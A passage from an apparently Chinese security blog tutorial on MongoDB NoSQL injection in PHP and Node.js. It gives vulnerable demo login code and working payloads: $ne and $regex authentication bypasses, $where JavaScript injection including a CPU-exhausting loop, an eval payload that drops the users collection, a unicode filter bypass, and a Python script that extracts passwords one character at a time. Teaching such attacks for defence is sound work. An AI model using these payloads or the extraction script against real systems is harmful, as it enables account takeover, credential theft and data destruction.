    foreach ($result as $user) &#123;
        $user = ((array)$user);
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username:&#x27; . $user[&#x27;username&#x27;] . &#x27;&lt;br&gt;&#x27;;
        echo &#x27;password:&#x27; . $user[&#x27;password&#x27;] . &#x27;&lt;br&gt;&#x27;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>

<p>如下，当正常用户想要登陆 whoami 用户时，POST 方法提交的数据如下：</p>
<pre><code class="highlight plaintext">username=whoami&amp;password=657260</code></pre>

<p>进入 PHP 后的程序数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;whoami&#x27;,
    &#x27;password&#x27; =&gt; &#x27;657260&#x27;
)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;whoami&#x27;, &#x27;password&#x27;:&#x27;657260&#x27;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;</code></pre>

<p>我们从代码中可以看出，这里对用户输入没有做任何过滤与校验，那么我们可以通过 <code>$ne</code> 关键字构造一个永真的条件就可以完成 NoSQL 注入：</p>
<pre><code class="highlight plaintext">username[$ne]=1&amp;password[$ne]=1</code></pre>

<p>如下图所示，成功查出所有的用户信息，说明成功注入了一个永真查询条件：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),
    &#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)
)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#123;$ne:1&#125;, &#x27;password&#x27;:&#123;$ne:1&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;</code></pre>

<p>由于 users 集合中 username 和 password 都不等于 1，所以将所有的文档数据查出，这很可能是真实的，并且可能允许攻击者绕过身份验证。</p>
<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们发送 <code>value=1</code> 那么，也就是发送了一个 <code>value</code> 的值为 1 的数据。如果发送 <code>value[$ne]=1</code> 则 PHP 会将其转换为数组 <code>value=array($ne=&gt;1)</code>，当数据到了进入 MongoDB 后，原来一个单一的 <code>&#123;&quot;value&quot;:1&#125;</code> 查询就变成了一个 <code>&#123;&quot;value&quot;:&#123;$ne:1&#125;</code> 条件查询。同样的，我们也可以使用下面这些作为 payload 进行攻击：</p>
<pre><code class="highlight plaintext">username[$ne]=&amp;password[$ne]=
username[$gt]=&amp;password[$gt]=
username[$gte]=&amp;password[$gte]=</code></pre>

<p>这种重言式注入的方式也是我们通常用来验证网站是否存在 NoSQL 注入的第一步。</p>
<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>在 MongoDB 之类的流行数据存储中，JSON 查询结构使得联合查询注入攻击变得比较复杂了，但也是可以实现的。</p>
<p>我们都知道，直接对 SQL 查询语句进行字符拼接串容易造成 SQL 注入，NoSQL 也有类似问题。如下实例，假设后端的 MongoDB 查询语句使用了字符串拼接：</p>
<pre><code class="highlight plaintext">string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot;</code></pre>

<p>当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：</p>
<pre><code class="highlight plaintext">&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#x27;123456&#x27;&#125;</code></pre>

<p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p>
<pre><code class="highlight plaintext">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</code></pre>

<p>拼接入查询语句后相当于执行了：</p>
<pre><code class="highlight plaintext">&#123; username: &#x27;admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;:&#x27;a&#x27;, password: &#x27;&#x27; &#125;], $comment: &#x27;123456&#x27;&#125;</code></pre>

<p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p>
<pre><code class="highlight plaintext">select * from logins where username = &#x27;admin&#x27; and (password true&lt;&gt; or (&#x27;a&#x27;=&#x27;a&#x27; and password = &#x27;&#x27;))</code></pre>

<p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p>
<p>但是现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query 对象了，因此这种注入方法简单了解一下就好了。</p>
<h4 id="js注入"><a href="#js注入" class="headerlink" title="js注入"></a>js注入</h4><h5 id="where-操作符"><a href="#where-操作符" class="headerlink" title="$where 操作符"></a>$where 操作符</h5><p>首先我们需要了解一下 <code>$where</code> 操作符。在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以在自定义的函数里获取数据库的所有信息。</p>
<p>如下实例：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;whoami&#x27;)&#125;&quot; &#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&gt;</code></pre>

<p>由于使用了 <code>$where</code> 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 <code>$userData</code> 获取查询条件：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)</code></pre>

<p>然后，攻击者可能会注入一种恶意的字符串如 <code>&#39;a&#39;; sleep(5000)</code> ，此时 MongoDB 执行的查询语句为：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;a&#x27;; sleep(5000))&#125;&quot; &#125;)</code></pre>

<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。</p>
<p>下面我们编写 index.php 进行测试：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];
$function = &quot;
function() &#123; 
    var username = &#x27;&quot;.$username.&quot;&#x27;;
    var password = &#x27;&quot;.$password.&quot;&#x27;;
    if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;&quot;;
$query = new MongoDB\Driver\Query(array(
    &#x27;$where&#x27; =&gt; $function
));
$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username: &#x27;.$user[&#x27;username&#x27;].&quot;&lt;br&gt;&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;password&#x27;].&quot;&lt;br&gt;&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>

<ul>
<li><strong>MongoDB 2.4 之前</strong></li>
</ul>
<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p>
<p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#x27;1</code></pre>

<ul>
<li><strong>MongoDB 2.4 之后</strong></li>
</ul>
<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;return true//
或
username=1&amp;password=1&#x27;;return true;var a=&#x27;1</code></pre>

<p>如下图所示，成功查出所有的用户信息：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>这是因为发送 payload 进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;$where&#x27; =&gt; &quot;
    function() &#123; 
        var username = &#x27;1&#x27;;
        var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;
        if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
            return true;
        &#125;else&#123;
            return false;
        &#125;
    &#125;
&quot;)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;$where: &quot;function() &#123; var username = &#x27;1&#x27;;var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123; return true; &#125;else&#123; return false; &#125;&#125;&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;
&gt;</code></pre>

<p>我们从代码中可以看出，password 中的 <code>return true</code> 使得整个 JavaScript 代码提前结束并返回了 <code>true</code>，这样就构造出了一个永真的条件并完成了 NoSQL 注入。</p>
<p>此外还有一个类似于 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();var a=&#x27;1</code></pre>

<h5 id="commmand方法注入"><a href="#commmand方法注入" class="headerlink" title="commmand方法注入"></a>commmand方法注入</h5><p>MongoDB driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:</p>
<pre><code class="highlight plaintext">&lt;?php
$m = new MongoDB\Driver\Manager;
// Don&#x27;t do this!!!
$username = $_GET[&#x27;field&#x27;];
// $username is set to &quot;&#x27;); db.users.drop(); print(&#x27;&quot;$cmd = new \MongoDB\Driver\Command( [
&#x27;eval&#x27; =&gt; &quot;print(&#x27;Hello, $username!&#x27;);&quot;
] );

$r = $m-&gt;executeCommand( &#x27;dramio&#x27;, $cmd );?&gt;</code></pre>

<p>也可以用Command去实现Mongo的<code>distinct</code>方法</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager();

$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$cmd = new MongoDB\Driver\Command([
&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;
]);
echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;;
$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();
$result =((array)$result[0])[&#x27;retval&#x27;];
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;用户不存在&#x27;;
&#125;
?&gt;</code></pre>

<p>这个就危险太多了，就相当于把mongo shell开放给用户了，你基本可以构建任何mongo shell可以执行的payload了，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多。如构建</p>
<pre><code class="highlight plaintext">payload:username=2&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;username&#x27;:&#x27;2</code></pre>



<h5 id="execute方法注入"><a href="#execute方法注入" class="headerlink" title="execute方法注入"></a>execute方法注入</h5><p>在旧版本中，可以用execute来执行一段字符串</p>
<pre><code class="highlight plaintext">&lt;?php

$mongo = new mongoclient();
$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$db = $mongo-&gt;sec_test; // 选择数据库
$query = &quot;db.users.find(&#123;&#x27;uname&#x27;: &quot;.$uname.&quot;&#125;,&#123;&#x27;pwd&#x27;, &quot;.$pwd.&quot;&#125;)&quot;;
$result = $db-&gt;execute($query);

if ($result-&gt;count() &gt; 0) &#123;
    foreach ($result as $user) &#123;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;该用户不存在&#x27;;
&#125;
?&gt;</code></pre>

<p>而在新版本中，多用executeQuery来进行查询</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
<span class="string">&#x27;$where&#x27;</span> =&gt; <span class="variable">$function</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;用户不存在&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;uname&#x27;</span>=&gt;<span class="variable">$uname</span>,
    <span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="variable">$pwd</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>



<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>
<p>我们还是利用第一个 index.php 进行演示：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span>);
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,
    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();
<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span> = ((<span class="keyword">array</span>)<span class="variable">$user</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;Login Failed&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=.&#123;4&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;5&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;6&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;7&#125;    // 登录失败
......</code></pre>

<p>在 <code>password[$regex]=.&#123;6&#125;</code> 时可以成功登录，但在 <code>password[$regex]=.&#123;7&#125;</code> 时登录失败，说明该 whoami 用户的密码长度为 7。</p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;admin&#x27;,
    &#x27;password&#x27; =&gt; array(&#x27;$regex&#x27; =&gt; &#x27;.&#123;6&#125;&#x27;)
)</code></pre>

<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;6&#125;&#x27;&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;7&#125;&#x27;&#125;&#125;)
&gt;</code></pre>

<p>由于 whoami 用户的 password 长度为 6，所以查询条件 <code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#123;$regex:&#39;.&#123;6&#125;&#39;&#125;&#125;</code> 为真，便能成功登录，而 <code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#123;$regex:&#39;.&#123;7&#125;&#39;&#125;&#125;</code> 为假，自然也就登录不了。</p>
<p>知道 password 的长度之后我们便可以逐位提取 password 的字符了：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=1.&#123;5&#125;
username=admin&amp;password[$regex]=12.&#123;4&#125;
username=admin&amp;password[$regex]=123.&#123;3&#125;
username=admin&amp;password[$regex]=1234.&#123;2&#125;
username=admin&amp;password[$regex]=12345.*
username=admin&amp;password[$regex]=123456
或
username=admin&amp;password[$regex]=^1
username=admin&amp;password[$regex]=^12
username=admin&amp;password[$regex]=^123
username=admin&amp;password[$regex]=^1234
username=admin&amp;password[$regex]=^12345
username=admin&amp;password[$regex]=^123456</code></pre>

<p>这是某个师傅的盲注脚本，贴一下</p>
<pre><code class="highlight plaintext">import requests
import string

password = &#x27;&#x27;
url = &#x27;http://192.168.226.148/index.php&#x27;

while True:
    for c in string.printable:
        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:

            # When the method is GET
            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)
            # When the method is POST
            post_payload = &#123;
                &quot;username&quot;: &quot;admin&quot;,
                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c
            &#125;
            # When the method is POST with JSON
            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;$regex&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)
            #headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json

            r = requests.post(url=url, data=post_payload)
            if &#x27;Login Success&#x27; in r.text:
                print(&quot;[+] %s&quot; % (password + c))
                password += c


# 输出如下: 
# [+] 1
# [+] 12
# [+] 123
# [+] 1234
# [+] 12345
# [+] 123456</code></pre>

<h3 id="Nodejs中的MongoDB注入"><a href="#Nodejs中的MongoDB注入" class="headerlink" title="Nodejs中的MongoDB注入"></a>Nodejs中的MongoDB注入</h3><p>NodeJS里面的Nosql就主要式重言式注入了，构造永真式密码来实现登陆绕过</p>
<ul>
<li>server.js</li>
</ul>
<pre><code class="highlight plaintext">var express = require(&#x27;express&#x27;);
var mongoose = require(&#x27;mongoose&#x27;);
var jade = require(&#x27;jade&#x27;);
var bodyParser = require(&#x27;body-parser&#x27;);

mongoose.connect(&#x27;mongodb://localhost/test&#x27;, &#123; useNewUrlParser: true &#125;);
var UserSchema = new mongoose.Schema(&#123;
    name: String,
    username: String,
    password: String
&#125;);
var User = mongoose.model(&#x27;users&#x27;, UserSchema);
var app = express();

app.set(&#x27;views&#x27;, __dirname);
app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);

app.get(&#x27;/&#x27;, function(req, res) &#123;
    res.render (&quot;index.jade&quot;,&#123;
        message: &#x27;Please Login&#x27;
    &#125;);
&#125;);

app.use(bodyParser.json());

app.post(&#x27;/&#x27;, function(req, res) &#123;
    console.log(req.body)
    User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123;
        console.log(user)
        if (err) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: err.message&#125;);
        &#125;
        if (!user) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Login Failed&#x27;&#125;);
        &#125;

        return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Welcome back &#x27; + user.name + &#x27;!&#x27;&#125;);
    &#125;);
&#125;);

var server = app.listen(8000, &#x27;0.0.0.0&#x27;, function () &#123;

    var host = server.address().address
    var port = server.address().port
    console.log(&quot;listening on http://%s:%s&quot;, host, port)
&#125;);
</code></pre>

<ul>
<li>index.jade</li>
</ul>
<pre><code class="highlight plaintext">h1 #&#123;message&#125;
p #&#123;message&#125;</code></pre>

<p>运行访问，发送</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161641-79e9c82a-ec57-1.png" alt="20210724161641-79e9c82a-ec57-1"></p>
<p>成功登录</p>
<p>如果<code>$ne</code>关键字被过滤也可以用unicode来绕过</p>
<p>因为JSON是可以直接解unicode的</p>
<p>belike:</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;\u0024\u006e\u0065&quot;:1&#125;,&quot;password&quot;: &#123;&quot;\u0024\u006e\u0065&quot;:1&#125;&#125;
// &#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>





</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/">https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-SQL/">-Web -SQL</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div 